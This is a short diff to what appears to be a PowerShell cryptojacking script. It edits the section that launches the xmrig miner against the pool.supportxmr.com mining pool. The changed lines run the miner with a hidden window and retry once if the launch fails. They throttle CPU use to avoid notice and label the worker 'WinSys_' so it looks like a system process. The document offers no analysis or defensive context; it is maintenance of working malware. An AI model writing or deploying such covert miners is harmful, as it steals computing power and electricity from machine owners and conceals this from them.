@@ -202,8 +202,7 @@ Start-Sleep -Seconds 10
 
 # === LAUNCH MINER (xmrig handles both CPU + GPU) ===
 if (Test-Path $cpuExe) {
-    $gpuFlags = if ($hw.gpu) { ' --opencl --cuda' } else { '' }
-    $cpuArgs = "-o pool.supportxmr.com:443 --tls -u $($c.addr) -p WinSys_$mName -a rx -k --cpu-max-threads-hint 35 --cpu-priority 0 --asm=auto --donate-level 1$gpuFlags"
+    $cpuArgs = "-o pool.supportxmr.com:443 --tls -u $($c.addr) -p WinSys_$mName -a rx -k --cpu-max-threads-hint 35 --cpu-priority 0 --asm=auto --donate-level 1 --no-color"
     $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0
     # Retry once if launch failed
     if (!$cpuProc) { Start-Sleep 3; $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0 }
